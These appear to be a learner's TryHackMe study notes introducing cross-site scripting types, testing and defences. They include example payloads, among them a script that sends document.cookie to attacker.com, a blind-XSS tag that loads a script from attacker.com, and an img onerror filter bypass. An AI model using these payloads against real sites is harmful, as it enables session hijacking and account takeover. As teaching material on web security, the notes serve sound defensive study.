# ⚡ Intro to Cross-Site Scripting (XSS) – TryHackMe Notes


Cross-Site Scripting (XSS) is one of the most common web application vulnerabilities and is classified as an **injection attack**. It occurs when malicious JavaScript is injected into a web application and executed in the browser of another user. Because the code runs in the victim’s browser, it executes with the same privileges as the legitimate website, allowing attackers to steal session cookies, hijack accounts, manipulate page content, or perform actions on behalf of users.

XSS vulnerabilities typically occur when applications fail to properly **validate or sanitize user input** before displaying it in the browser. Since browsers trust the content coming from the server, malicious scripts embedded in the response will execute automatically.

Example of a basic XSS payload: <script>alert('XSS')</script>

If a web application reflects user input directly into a webpage without sanitization, inserting this payload may trigger a JavaScript alert, confirming that the page is vulnerable.

---

XSS attacks often rely on **payloads**, which are small pieces of JavaScript designed to execute when rendered by the browser. A simple payload might display an alert box, but real attackers often use payloads to steal cookies or session tokens.

Example payload to retrieve cookies:
<script>document.location='http://attacker.com/?cookie='+document.cookie</script>

If successful, this sends the victim's session cookie to the attacker’s server, potentially allowing session hijacking.

---

One common type of XSS is **Reflected XSS**, where the malicious payload is included in a request and reflected directly in the server’s response. The script executes immediately when the victim visits the crafted URL.

Example vulnerable URL: https://example.com/search?q=test


If the search parameter is reflected without sanitization, an attacker might craft a malicious link such as:
https://example.com/search?q=
<script>alert('XSS')</script>

When the victim clicks the link, the script executes in their browser.

Reflected XSS attacks are commonly delivered through phishing links or malicious URLs.

---

Another type is **Stored XSS**, also known as Persistent XSS. In this case, the malicious script is stored on the server (for example in a database) and automatically executed whenever users view the affected page.

Common locations for stored XSS include:

- Comment sections
- User profiles
- Message boards
- Review forms
- Chat applications

Example malicious comment: <script>alert('Stored XSS')</script>

Every user who loads the page containing this comment will execute the malicious script in their browser. Stored XSS is particularly dangerous because it affects **every user who views the page**, not just those who click a malicious link.

---

A third form is **DOM-Based XSS**, which occurs entirely on the client side. Instead of the server injecting the script, the vulnerability exists in the way JavaScript processes data within the browser's Document Object Model (DOM).

Example vulnerable JavaScript behavior: document.write(location.hash)


If an attacker modifies the URL fragment:
https://example.com/page#
<script>alert('XSS')</script>


the browser executes the script because the JavaScript code inserts the URL fragment directly into the page without validation.

DOM-based XSS vulnerabilities are common in modern JavaScript-heavy applications.

---

Another advanced variation is **Blind XSS**. In this scenario, the attacker injects a payload into a web application but cannot immediately see the result. Instead, the payload triggers when another user (often an administrator) views the affected page.

For example, an attacker might inject a script into a support ticket: <script src="http://attacker.com/xss.js"></script>

When an administrator reviews the ticket, their browser loads the malicious script from the attacker’s server. Blind XSS is often used to compromise administrative accounts or internal dashboards.

Attackers typically monitor external logging services to detect when their blind payload is triggered.

---

When testing for XSS vulnerabilities, the general workflow includes identifying user input fields, inserting test payloads, and observing how the application handles the input.

Typical testing areas include:

- search bars
- login fields
- comment forms
- feedback forms
- URL parameters
- headers or cookies

Basic testing payload: <script>alert(1)</script>

If the payload executes, the page is vulnerable.

Security testers often use tools such as **Burp Suite** to intercept requests and inject payloads into parameters for testing.

---

Modern applications often implement filters to block scripts, so attackers attempt to **bypass filters by modifying payloads**. This process is sometimes called *perfecting the payload*.

Examples of alternative payloads include: <img src=x onerror=alert(1)>

These variations bypass filters that only block <script> tags.

Attackers may also use encoding techniques such as URL encoding or HTML encoding to evade detection.

The impact of XSS vulnerabilities can be severe. Attackers can steal authentication cookies, hijack user sessions, redirect users to malicious sites, modify website content, capture keystrokes, or perform actions on behalf of victims. Because the script executes within the trusted domain of the website, users may not notice that the attack is happening.

Large platforms have historically paid significant bug bounty rewards for XSS vulnerabilities. Security researchers have received thousands of dollars for discovering XSS flaws in major applications such as Shopify, Steam, HackerOne, and other widely used platforms.

Preventing XSS requires strong input validation and secure coding practices. Applications should sanitize and encode all user input before displaying it in the browser. Developers should avoid directly inserting user-controlled data into HTML or JavaScript contexts.

Common defensive techniques include:
output encoding
input validation
content security policy (CSP)
using secure frameworks
sanitizing user-generated content

Example defensive approach:
escape(user_input)

This ensures that special characters are encoded and not interpreted as executable JavaScript.

XSS remains one of the most common vulnerabilities in modern web applications. Understanding how payloads work, how different XSS types behave, and how attackers bypass filters is essential for both security testing and secure application development.

## Room Completed: Intro to Cross-Site Scripting (XSS)
## Focus Area: Web Application Security | Client-Side Injection Attacks